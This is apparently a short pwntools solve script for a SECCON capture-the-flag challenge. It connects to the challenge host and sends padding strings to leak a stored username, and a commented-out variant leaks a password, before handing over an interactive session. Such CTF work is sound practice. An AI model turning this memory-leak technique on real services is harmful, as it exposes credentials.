#!/usr/bin/python2
from pwn import *

HOST = "lazy.chal.seccon.jp"
PORT = 33333

def go():
    s = remote(HOST, PORT)

    # leak username
    s.sendline("2")
    s.sendline("A" * 63)
    s.sendline("")

    # leak password
    # s.sendline("2")
    # s.sendline("A" * 31)
    # s.sendline("")
    
    s.interactive()

go()